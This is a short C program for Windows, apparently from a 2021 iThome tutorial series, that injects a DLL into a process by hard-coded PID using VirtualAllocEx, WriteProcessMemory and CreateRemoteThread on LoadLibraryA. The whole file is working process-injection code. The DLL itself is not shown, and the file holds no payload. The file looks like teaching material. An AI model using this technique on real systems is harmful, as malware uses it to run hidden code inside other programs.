#include <windows.h>
#include <stdio.h>

char dllname[150] = "D:\\hacker\\activity\\2021iThome\\樸實無華的DLLInjection\\InjectedDLL\\x64\\Debug\\InjectedDLL";
DWORD pid = 11736;

int main() {
	HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	int size = strlen(dllname) + 5;
	PVOID procdlladdr = VirtualAllocEx(hprocess, NULL, size, MEM_COMMIT, PAGE_READWRITE);
	if (procdlladdr == NULL) {
		printf("handle %p VirtualAllocEx failed\n", hprocess);
		return 0;
	}
	SIZE_T writenum;
	if (!WriteProcessMemory(hprocess, procdlladdr, dllname, size, &writenum)) {
		printf("handle %p WriteProcessMemory failed\n", hprocess);
		return 0;
	}
	FARPROC loadfuncaddr = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	if (!loadfuncaddr) {
		printf("handle %p GetProcAddress failed\n", hprocess);
		return 0;
	}
	HANDLE hthread = CreateRemoteThread(hprocess, NULL, 0, (LPTHREAD_START_ROUTINE)loadfuncaddr, (LPVOID)procdlladdr, 0, NULL);
	if (!hthread) {
		printf("handle %p CreateRemoteThread failed\n", hprocess);
		return 0;
	}

	printf("handle %p Injection done, WaitForSingleObject return %d\n", hprocess, WaitForSingleObject(hthread, INFINITE));
	CloseHandle(hthread);
	CloseHandle(hprocess);

	return 0;
}